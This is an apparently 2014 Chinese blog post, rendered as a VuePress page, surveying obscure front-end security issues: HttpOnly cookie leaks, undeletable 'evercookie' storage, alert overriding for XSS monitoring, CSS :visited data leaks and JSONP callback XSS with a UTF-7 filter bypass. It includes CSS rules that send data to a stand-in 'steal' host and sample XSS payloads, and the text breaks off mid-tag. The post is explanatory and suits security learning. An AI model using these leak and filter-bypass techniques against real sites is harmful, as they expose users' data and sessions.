<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-beta.46">
    <style>
      :root {
        --c-bg: #fff;
      }
      html.dark {
        --c-bg: #22272e;
      }
      html, body {
        background-color: var(--c-bg);
      }
    </style>
    <script>
      const userMode = localStorage.getItem('vuepress-color-scheme');
			const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
			if (userMode === 'dark' || (userMode !== 'light' && systemDarkMode)) {
				document.documentElement.classList.toggle('dark', true);
			}
    </script>
    <title>前端安全冷门知识杂谈 | </title><meta name="description" content="">
    <link rel="modulepreload" href="/assets/app.3398e39f.js"><link rel="modulepreload" href="/assets/safety-point-of-view-from-front-end.html.97747568.js"><link rel="modulepreload" href="/assets/safety-point-of-view-from-front-end.html.d7583e7f.js"><link rel="prefetch" href="/assets/index.html.ba9440ef.js"><link rel="prefetch" href="/assets/a-chrismas-ico.html.89185cb2.js"><link rel="prefetch" href="/assets/about-pjax.html.97c62139.js"><link rel="prefetch" href="/assets/assassins-creed.html.7ab82df0.js"><link rel="prefetch" href="/assets/brave-new-world.html.0530c3ae.js"><link rel="prefetch" href="/assets/brief-oauth.html.9aad3e13.js"><link rel="prefetch" href="/assets/changbaishan.html.1ba85448.js"><link rel="prefetch" href="/assets/coffee.html.7f7e1239.js"><link rel="prefetch" href="/assets/css-jiugongge.html.cf5f679f.js"><link rel="prefetch" href="/assets/css-jiugongge2.html.1334b07c.js"><link rel="prefetch" href="/assets/css3-animater.html.d9c32254.js"><link rel="prefetch" href="/assets/diary-2016-0710-0716.html.66fbfe3e.js"><link rel="prefetch" href="/assets/diary-2016-0717-0723.html.c2b5ce53.js"><link rel="prefetch" href="/assets/diary-2016-0724-0730.html.77c80bda.js"><link rel="prefetch" href="/assets/diary-2016-0731-0806.html.d1d81ec6.js"><link rel="prefetch" href="/assets/diary-2016-0807-0813.html.682730b6.js"><link rel="prefetch" href="/assets/diary-2016-0814-0820.html.4755a77d.js"><link rel="prefetch" href="/assets/diary-2016-0904-0910.html.411c93a2.js"><link rel="prefetch" href="/assets/diary-2016-0911-0924.html.ebf4211d.js"><link rel="prefetch" href="/assets/diary-2016-1001-1007.html.9c53cf72.js"><link rel="prefetch" href="/assets/diary-2016-1008-1015.html.260fa7eb.js"><link rel="prefetch" href="/assets/diary-2016-1016-1022.html.b3337036.js"><link rel="prefetch" href="/assets/diary-2016-1023-1029.html.f039629c.js"><link rel="prefetch" href="/assets/diary-2016-1030-1105.html.3c6eb151.js"><link rel="prefetch" href="/assets/diary-2016-1112-1119.html.0cc306f9.js"><link rel="prefetch" href="/assets/diary-2016-1225-1231.html.ad70bfc6.js"><link rel="prefetch" href="/assets/diary-2017-0101-0107.html.fb0f4566.js"><link rel="prefetch" href="/assets/diary-2017-0118-0125.html.7b5803ad.js"><link rel="prefetch" href="/assets/diary-2017-0212-0218.html.b54ddd0d.js"><link rel="prefetch" href="/assets/diary-2017-0305-0311.html.82ee7405.js"><link rel="prefetch" href="/assets/diary-2017-0416-0422.html.d879a116.js"><link rel="prefetch" href="/assets/diary-2017-0521-0527.html.1bab3615.js"><link rel="prefetch" href="/assets/douban-index-for-chrome.html.47b2d15f.js"><link rel="prefetch" href="/assets/feng-shui.html.4f63a789.js"><link rel="prefetch" href="/assets/folder-to-tree.html.90f45fcd.js"><link rel="prefetch" href="/assets/graduation-shirt-design.html.209364cb.js"><link rel="prefetch" href="/assets/guide-for-zb.html.fa200c5f.js"><link rel="prefetch" href="/assets/gulangyu.html.f472a695.js"><link rel="prefetch" href="/assets/hack-in-localstorage.html.53f8aa7a.js"><link rel="prefetch" href="/assets/handling-asynchronous-js.html.8097665b.js"><link rel="prefetch" href="/assets/hello-world.html.6d37f274.js"><link rel="prefetch" href="/assets/hexo-theme-yilia.html.da09280e.js"><link rel="prefetch" href="/assets/history-of-browser-useragent.html.37bdb233.js"><link rel="prefetch" href="/assets/history-of-browser-useragent2.html.50c33d75.js"><link rel="prefetch" href="/assets/img-lazy-load.html.5407e6c7.js"><link rel="prefetch" href="/assets/instagram-api-ex.html.82b1c716.js"><link rel="prefetch" href="/assets/journey-to-yunnan.html.850719f5.js"><link rel="prefetch" href="/assets/kael-qrcode-info.html.e19cbb92.js"><link rel="prefetch" href="/assets/lock-me-in-a-cup.html.9996d006.js"><link rel="prefetch" href="/assets/logic-of-chord.html.4238aa72.js"><link rel="prefetch" href="/assets/mediator-model.html.f0aea667.js"><link rel="prefetch" href="/assets/my-fairy-tale1.html.9e24960d.js"><link rel="prefetch" href="/assets/my-fairy-tale2.html.884cb556.js"><link rel="prefetch" href="/assets/my-fairy-tale3.html.588af47c.js"><link rel="prefetch" href="/assets/my-fairy-tale4.html.cf518aae.js"><link rel="prefetch" href="/assets/my-news-reader-box.html.5bebe985.js"><link rel="prefetch" href="/assets/my2013.html.319ac566.js"><link rel="prefetch" href="/assets/nginx-in-fe.html.d5c0bd5a.js"><link rel="prefetch" href="/assets/no-one-used-pro.html.4e1f7f1a.js"><link rel="prefetch" href="/assets/oauth-rabbit.html.ac4a8aaf.js"><link rel="prefetch" href="/assets/prevent-spiders.html.f8fb6d1b.js"><link rel="prefetch" href="/assets/reduce-http-requests.html.72fb8432.js"><link rel="prefetch" href="/assets/share-a-css-hack.html.6c9bca98.js"><link rel="prefetch" href="/assets/something-about-immersion.html.0b4a2c82.js"><link rel="prefetch" href="/assets/the-storied-life-of-aj.html.bad8cca0.js"><link rel="prefetch" href="/assets/theme-update1-dot-0.html.f10e351b.js"><link rel="prefetch" href="/assets/thinner-than-1px-border.html.07773ff6.js"><link rel="prefetch" href="/assets/three-drama.html.53efe0a3.js"><link rel="prefetch" href="/assets/two-magics-of-the-pilot.html.3281561d.js"><link rel="prefetch" href="/assets/viewing-commentary.html.ce8360d5.js"><link rel="prefetch" href="/assets/volunteer-activities.html.e524147d.js"><link rel="prefetch" href="/assets/web-worker-learning.html.3e807a0e.js"><link rel="prefetch" href="/assets/yilia-on-mobile.html.21a4600f.js"><link rel="prefetch" href="/assets/404.html.f166316b.js"><link rel="prefetch" href="/assets/index.html.8b42ef7f.js"><link rel="prefetch" href="/assets/a-chrismas-ico.html.26b2f527.js"><link rel="prefetch" href="/assets/about-pjax.html.3c650957.js"><link rel="prefetch" href="/assets/assassins-creed.html.89f88cae.js"><link rel="prefetch" href="/assets/brave-new-world.html.2a6b5aa6.js"><link rel="prefetch" href="/assets/brief-oauth.html.d8f0e7e5.js"><link rel="prefetch" href="/assets/changbaishan.html.189218d0.js"><link rel="prefetch" href="/assets/coffee.html.4c8be66f.js"><link rel="prefetch" href="/assets/css-jiugongge.html.9b5a508c.js"><link rel="prefetch" href="/assets/css-jiugongge2.html.ab6051fe.js"><link rel="prefetch" href="/assets/css3-animater.html.139eb34d.js"><link rel="prefetch" href="/assets/diary-2016-0710-0716.html.7a2b0c25.js"><link rel="prefetch" href="/assets/diary-2016-0717-0723.html.1bd3af7d.js"><link rel="prefetch" href="/assets/diary-2016-0724-0730.html.30f9c39d.js"><link rel="prefetch" href="/assets/diary-2016-0731-0806.html.bc938d2e.js"><link rel="prefetch" href="/assets/diary-2016-0807-0813.html.a6786712.js"><link rel="prefetch" href="/assets/diary-2016-0814-0820.html.761bfbba.js"><link rel="prefetch" href="/assets/diary-2016-0904-0910.html.26af90e9.js"><link rel="prefetch" href="/assets/diary-2016-0911-0924.html.f3b38d89.js"><link rel="prefetch" href="/assets/diary-2016-1001-1007.html.acd74014.js"><link rel="prefetch" href="/assets/diary-2016-1008-1015.html.0c926c23.js"><link rel="prefetch" href="/assets/diary-2016-1016-1022.html.7408c19a.js"><link rel="prefetch" href="/assets/diary-2016-1023-1029.html.cd336d75.js"><link rel="prefetch" href="/assets/diary-2016-1030-1105.html.51febe57.js"><link rel="prefetch" href="/assets/diary-2016-1112-1119.html.f04c4f98.js"><link rel="prefetch" href="/assets/diary-2016-1225-1231.html.c8d88d11.js"><link rel="prefetch" href="/assets/diary-2017-0101-0107.html.616426b7.js"><link rel="prefetch" href="/assets/diary-2017-0118-0125.html.bfed96da.js"><link rel="prefetch" href="/assets/diary-2017-0212-0218.html.ef3cd352.js"><link rel="prefetch" href="/assets/diary-2017-0305-0311.html.43aad639.js"><link rel="prefetch" href="/assets/diary-2017-0416-0422.html.3af0458a.js"><link rel="prefetch" href="/assets/diary-2017-0521-0527.html.8fbdeea3.js"><link rel="prefetch" href="/assets/douban-index-for-chrome.html.b4cb7f42.js"><link rel="prefetch" href="/assets/feng-shui.html.0c6ed08e.js"><link rel="prefetch" href="/assets/folder-to-tree.html.61acaaff.js"><link rel="prefetch" href="/assets/graduation-shirt-design.html.1c444eaf.js"><link rel="prefetch" href="/assets/guide-for-zb.html.b6d7c6cc.js"><link rel="prefetch" href="/assets/gulangyu.html.021b58a0.js"><link rel="prefetch" href="/assets/hack-in-localstorage.html.7c0fcc97.js"><link rel="prefetch" href="/assets/handling-asynchronous-js.html.0f88537e.js"><link rel="prefetch" href="/assets/hello-world.html.a3964cc6.js"><link rel="prefetch" href="/assets/hexo-theme-yilia.html.fb004412.js"><link rel="prefetch" href="/assets/history-of-browser-useragent.html.2c5ae29e.js"><link rel="prefetch" href="/assets/history-of-browser-useragent2.html.5629ae5c.js"><link rel="prefetch" href="/assets/img-lazy-load.html.b4bf44ea.js"><link rel="prefetch" href="/assets/instagram-api-ex.html.3b3cfeaa.js"><link rel="prefetch" href="/assets/journey-to-yunnan.html.c1bc777f.js"><link rel="prefetch" href="/assets/kael-qrcode-info.html.acad9415.js"><link rel="prefetch" href="/assets/lock-me-in-a-cup.html.e724e02d.js"><link rel="prefetch" href="/assets/logic-of-chord.html.6304261e.js"><link rel="prefetch" href="/assets/mediator-model.html.f67e4ebd.js"><link rel="prefetch" href="/assets/my-fairy-tale1.html.c3e8673d.js"><link rel="prefetch" href="/assets/my-fairy-tale2.html.609b1245.js"><link rel="prefetch" href="/assets/my-fairy-tale3.html.3414eae5.js"><link rel="prefetch" href="/assets/my-fairy-tale4.html.c4962e69.js"><link rel="prefetch" href="/assets/my-news-reader-box.html.1620550d.js"><link rel="prefetch" href="/assets/my2013.html.895b86d4.js"><link rel="prefetch" href="/assets/nginx-in-fe.html.bda2ebcf.js"><link rel="prefetch" href="/assets/no-one-used-pro.html.b4a21850.js"><link rel="prefetch" href="/assets/oauth-rabbit.html.a5b25dc7.js"><link rel="prefetch" href="/assets/prevent-spiders.html.334dc9fe.js"><link rel="prefetch" href="/assets/reduce-http-requests.html.183fde1a.js"><link rel="prefetch" href="/assets/share-a-css-hack.html.bdfcd302.js"><link rel="prefetch" href="/assets/something-about-immersion.html.0f0fe315.js"><link rel="prefetch" href="/assets/the-storied-life-of-aj.html.e28618c6.js"><link rel="prefetch" href="/assets/theme-update1-dot-0.html.804d00b5.js"><link rel="prefetch" href="/assets/thinner-than-1px-border.html.36f5929c.js"><link rel="prefetch" href="/assets/three-drama.html.bf984fe3.js"><link rel="prefetch" href="/assets/two-magics-of-the-pilot.html.db685b26.js"><link rel="prefetch" href="/assets/viewing-commentary.html.dd44c6b0.js"><link rel="prefetch" href="/assets/volunteer-activities.html.dc68803a.js"><link rel="prefetch" href="/assets/web-worker-learning.html.ff47e92f.js"><link rel="prefetch" href="/assets/yilia-on-mobile.html.6f992b54.js"><link rel="prefetch" href="/assets/404.html.b1bfbdaf.js"><link rel="prefetch" href="/assets/404.5e85c5b4.js"><link rel="prefetch" href="/assets/Layout.924ef564.js">
    <link rel="stylesheet" href="/assets/style.3ac1bbff.css">
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container"><!--[--><header class="navbar"><div class="toggle-sidebar-button" title="toggle sidebar" aria-expanded="false" role="button" tabindex="0"><div class="icon" aria-hidden="true"><span></span><span></span><span></span></div></div><span><a href="/" class=""><!----><!----></a></span><div class="navbar-items-wrapper" style=""><!--[--><!--]--><!----><!--[--><!--]--><button class="toggle-dark-button" title="toggle dark mode"><svg style="" class="icon" focusable="false" viewBox="0 0 32 32"><path d="M16 12.005a4 4 0 1 1-4 4a4.005 4.005 0 0 1 4-4m0-2a6 6 0 1 0 6 6a6 6 0 0 0-6-6z" fill="currentColor"></path><path d="M5.394 6.813l1.414-1.415l3.506 3.506L8.9 10.318z" fill="currentColor"></path><path d="M2 15.005h5v2H2z" fill="currentColor"></path><path d="M5.394 25.197L8.9 21.691l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 25.005h2v5h-2z" fill="currentColor"></path><path d="M21.687 23.106l1.414-1.415l3.506 3.506l-1.414 1.414z" fill="currentColor"></path><path d="M25 15.005h5v2h-5z" fill="currentColor"></path><path d="M21.687 8.904l3.506-3.506l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 2.005h2v5h-2z" fill="currentColor"></path></svg><svg style="display:none;" class="icon" focusable="false" viewBox="0 0 32 32"><path d="M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3z" fill="currentColor"></path></svg></button><!----></div></header><!--]--><div class="sidebar-mask"></div><!--[--><aside class="sidebar"><!----><!--[--><!--]--><ul class="sidebar-items"><!--[--><li><p tabindex="0" class="sidebar-item sidebar-heading">前端安全冷门知识杂谈 <!----></p><ul style="" class="sidebar-item-children"><!--[--><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#date-2014-05-27-23-52" class="router-link-active router-link-exact-active sidebar-item" aria-label="date: 2014-05-27 23:52"><!--[--><!--]--> date: 2014-05-27 23:52 <!--[--><!--]--></a><ul style="" class="sidebar-item-children"><!--[--><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#零、概述" class="router-link-active router-link-exact-active sidebar-item" aria-label="零、概述"><!--[--><!--]--> 零、概述 <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#一、盗取无法用-js-读写的-cookie" class="router-link-active router-link-exact-active sidebar-item" aria-label="一、盗取无法用 js 读写的 Cookie"><!--[--><!--]--> 一、盗取无法用 js 读写的 Cookie <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#三、删不掉的本地存储" class="router-link-active router-link-exact-active sidebar-item" aria-label="三、删不掉的本地存储"><!--[--><!--]--> 三、删不掉的本地存储 <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#四、函数覆写监听上报" class="router-link-active router-link-exact-active sidebar-item" aria-label="四、函数覆写监听上报"><!--[--><!--]--> 四、函数覆写监听上报 <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#五、内存-cookie-与硬盘-cookie" class="router-link-active router-link-exact-active sidebar-item" aria-label="五、内存 Cookie 与硬盘 Cookie"><!--[--><!--]--> 五、内存 Cookie 与硬盘 Cookie <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#六、css-带来的点击量泄露" class="router-link-active router-link-exact-active sidebar-item" aria-label="六、CSS 带来的点击量泄露"><!--[--><!--]--> 六、CSS 带来的点击量泄露 <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#七、jsonp-回调函数与-utf-7-编码" class="router-link-active router-link-exact-active sidebar-item" aria-label="七、JSONP 回调函数与 UTF-7 编码"><!--[--><!--]--> 七、JSONP 回调函数与 UTF-7 编码 <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#八、过滤与代码混淆" class="router-link-active router-link-exact-active sidebar-item" aria-label="八、过滤与代码混淆"><!--[--><!--]--> 八、过滤与代码混淆 <!--[--><!--]--></a><!----></li><li><a aria-current="page" href="/posts/safety-point-of-view-from-front-end.html#九、心理学与社会工程学" class="router-link-active router-link-exact-active sidebar-item" aria-label="九、心理学与社会工程学"><!--[--><!--]--> 九、心理学与社会工程学 <!--[--><!--]--></a><!----></li><!--]--></ul></li><!--]--></ul></li><!--]--></ul><!--[--><!--]--></aside><!--]--><!--[--><main class="page"><!--[--><!--]--><div class="theme-default-content"><!--[--><!--]--><div><h2 id="date-2014-05-27-23-52" tabindex="-1"><a class="header-anchor" href="#date-2014-05-27-23-52" aria-hidden="true">#</a> date: 2014-05-27 23:52</h2><h3 id="零、概述" tabindex="-1"><a class="header-anchor" href="#零、概述" aria-hidden="true">#</a> 零、概述</h3><p>提起 web 前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br> 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。<br> 大概分为以下章节：</p><blockquote><p>盗取无法用 js 读写的 Cookie<br> 删不掉的本地存储<br> 函数覆写监听上报<br> 内存 Cookie 与硬盘 Cookie<br> CSS 带来的点击量泄露<br> JSONP 回调函数与 UTF-7 编码<br> 过滤与代码混淆<br> 心理学与社会工程学</p></blockquote><p>资料略多，文章较长，请自备瓜子…</p><h3 id="一、盗取无法用-js-读写的-cookie" tabindex="-1"><a class="header-anchor" href="#一、盗取无法用-js-读写的-cookie" aria-hidden="true">#</a> 一、盗取无法用 js 读写的 Cookie</h3><p>为了防范 xss 获取 Cookie，网络规范提供了 HttpOnly Cookie 机制，设置了该标志后，js 脚本将无法读写该 Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookie
setcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>我们还是可以通过一些服务器上的漏洞去获取它们。</p><h4 id="_2-1-调试信息泄露" tabindex="-1"><a class="header-anchor" href="#_2-1-调试信息泄露" aria-hidden="true">#</a> 2.1) 调试信息泄露</h4><p>比较经典的是 PHP 的 phpinfo 文件：<br><img src="/assets/blogImg/safety_001.jpg" alt="phpinfo文件"><br> 如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括 HttpOnly Cookie。<br> 访问 phpinfo.php，将看到：<br><img src="/assets/blogImg/safety_002.jpg" alt="Alt text"><br> 其他的服务器，如 python 的 Django，也有类似的调试信息文件，在外发时要注意清除。</p><h4 id="_2-2-apache-2-2-x-版本请求头超长泄露" tabindex="-1"><a class="header-anchor" href="#_2-2-apache-2-2-x-版本请求头超长泄露" aria-hidden="true">#</a> 2.2) Apache 2.2.x 版本请求头超长泄露</h4><p>Cookies 最大限制一般为 4kb 左右，如果请求头长度超过 LimitRequestFieldSize，将会引发 400 错误。在 Apache 2.2.x 多个版本内，如果引发 400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了 HttpOnly Cookie。 因此，我们可以利用这个漏洞，构造一个超长的请求，让 Apache 返回 400，并用 ajax 捕获 xhr.responseText 即可获得 HttpOnly Cookie 信息。<br><img src="/assets/blogImg/safety_003.jpg" alt="Alt text"></p><h3 id="三、删不掉的本地存储" tabindex="-1"><a class="header-anchor" href="#三、删不掉的本地存储" aria-hidden="true">#</a> 三、删不掉的本地存储</h3><p>如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且&quot;永久&quot;寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。<br> 但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：</p><blockquote><p>Cookie - 是最常见的方式，key-value 模式<br> UserData - IE 自己的本地存储，key-value 模式<br> localStorage - HTML5 新增的本地存储，key-value 模式<br> local Database - HTML5 新增的浏览器本地 DataBase，是 SQLite 数据库<br> Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器</p></blockquote><p>除去这些，我还收集了一些比较“偏门”的存储方案：</p><blockquote><p>Silverlight 的 IsolatedStorage - 类似 HTML5 localStorage<br> PNG Cache，将 Cookie 转换成 RGB 值描述形式，以 PNG Cache 方式强制缓存着，读入则以 HTML5 的 canvas 对象读取并还原为原来的 Cookie 值<br> HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容<br> Web History，利用的是“CSS 判断目标 URL 是否访问过”技巧，比如 a 标签访问过会显示紫色（新浏览器已 fix）<br> window.name，本质就是一个 DOM 存储，并不存在本地。</p></blockquote><p>老外 Samy Kamkar 用半天开发了一个 JavaScript API：<a href="http://en.wikipedia.org/wiki/Evercookie" target="_blank" rel="noopener noreferrer">evercookie<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewbox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>。<br> 该 API 利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当 evercookie 发现用某种机制存储的 cookie 被数据将删除之后，它将利用其它机制创建的 cookie 数据来重新创建，让用户几乎不可能删除 cookie。</p><h3 id="四、函数覆写监听上报" tabindex="-1"><a class="header-anchor" href="#四、函数覆写监听上报" aria-hidden="true">#</a> 四、函数覆写监听上报</h3><p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站 xss 的话，可以在你要监控的页面里覆写 alert 函数，记录 alert 调用情况。</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>function log(s) {
    var img = new Image();
    img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);
}

var _alert = alert;
window.alert = function(s) {
    log(alert.caller);
    _alert(s);
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如此，就能在有人调用 alert 时，就执行上报，以供监控。好吧，这里还涉及人的心理学…<br> 其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《<a href="http://www.xfocus.net/articles/200712/963.html" target="_blank" rel="noopener noreferrer">浅谈 javascript 函数劫持<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewbox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>》。</p><h3 id="五、内存-cookie-与硬盘-cookie" tabindex="-1"><a class="header-anchor" href="#五、内存-cookie-与硬盘-cookie" aria-hidden="true">#</a> 五、内存 Cookie 与硬盘 Cookie</h3><p><code>内存Cookie</code> - 指没有设置过期时间 Expires 的 Cookie，随浏览器关闭，此 Cookie 在内存中销毁<br><code>硬盘Cookie</code> - 设置了过期事件 Expires 的 Cookie，常驻硬盘，直到过期</p><p>我们很容易得出结论：内存 Cookie 更安全。因此，某些站点会把<code>敏感信息放到内存Cookie</code>里面。这原本是没什么风险的，但恰巧会在遇到 XSS 的时候失控。试想下，XSS 攻击者可以给内存 Cookie 加一个过期时间，使其变为硬盘 Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。</p><p>因此，这里有两个关注点：</p><ol><li>敏感信息还是不要放 Cookie 里，即使是内存 Cookie；</li><li>服务器要做 Cookie 的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。</li></ol><h3 id="六、css-带来的点击量泄露" tabindex="-1"><a class="header-anchor" href="#六、css-带来的点击量泄露" aria-hidden="true">#</a> 六、CSS 带来的点击量泄露</h3><p>在我们的印象中，前端安全基本是 js 带来的问题，但 css 也会有安全隐患吗？是的。除去 IE 下的 css 中执行 js 代码问题，还有另外一个关注点。<br> 假如有一个开源组件，我们只看了下 js 源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的 css 的…但有某种极端的情况，css 带来了意想不到的数据泄露。<br> 试想这是一个<code>导航栏组件</code>，html 代码是这样的：</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;
&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;
&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>你忽略掉的 css 写成这样：</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>#a1:visited {background: url(http://report.com/steal?data=a1);}
#a2:visited {background: url(http://report.com/steal?data=a2);}
#a3:visited {background: url(http://report.com/steal?data=a3);}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们用到业务里，用户点击这三个导航后，a 标签的 visited 伪属性生效，就会设置 background，而背景的 url 其实是上报地址。这时候，你的业务的<code>点击数据量</code>就暴露给第三方了！<br> 当然，这只针对旧版本浏览器，新版本浏览器都已 fix 这个问题。可是，HTML5 的出现又让这个问题回归了…<br> HTML5 提供伪类<code>::selection</code>，当指定对象区域被选择时，就会触发。其原理跟上面类似。</p><h3 id="七、jsonp-回调函数与-utf-7-编码" tabindex="-1"><a class="header-anchor" href="#七、jsonp-回调函数与-utf-7-编码" aria-hidden="true">#</a> 七、JSONP 回调函数与 UTF-7 编码</h3><h4 id="_7-1-基本原理" tabindex="-1"><a class="header-anchor" href="#_7-1-基本原理" aria-hidden="true">#</a> 7.1) 基本原理</h4><p>在 JSONP 技术中，服务器通常会让请求方在请求参数中提供 callback 函数名，而不是由数据提供方定制，如请求方发起请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code><br> 返回数据格式为：<br><code>some_function([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br> 如果，数据提供方没有对 callback 函数名做安全过滤，就会带来 XSS 问题。<br> 请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code> 返回：<br><code>&lt;script&gt;alert(1);&lt;/script&gt;([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br> 所以，一般服务器都会对 call_back 参数进行过滤，但过滤的方法是否会存在漏洞呢？</p><h4 id="_7-2-ie-解析-utf-7-漏洞" tabindex="-1"><a class="header-anchor" href="#_7-2-ie-解析-utf-7-漏洞" aria-hidden="true">#</a> 7.2) IE 解析 UTF-7 漏洞</h4><p>比较简单的过滤方法，是过滤<code>&lt;&gt;</code>字符，使得无法构成 html 标签。但在 IE6\IE7 的某些版本中，存在以下漏洞：<strong>如果发现文件前面是“+/v8”开头，就把文件当做 UTF-7 解析</strong>（IE7 后续版本已发布补丁修复）。<br> 在没被修复的 IE 版本中，如果我们将上面的请求用 utf-7 编码。再在前面加上&quot;+/v8&quot;头：<br><code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code><br> 这时候巧妙的躲开了<code>&lt;&gt;</code>过滤，而返回：<br><code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});</code><br> 这时 IE 将这个 jsonp 文件当作 utf-7 解析，依然触发 XSS。</p><h3 id="八、过滤与代码混淆" tabindex="-1"><a class="header-anchor" href="#八、过滤与代码混淆" aria-hidden="true">#</a> 八、过滤与代码混淆</h3><p>过滤器如果过滤了大部分的 js 函数，如 eval、alert 之类，是否就能保证安全呢？必然不是，我们还有强大的 js 代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：<a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener noreferrer">jsfuck<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewbox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 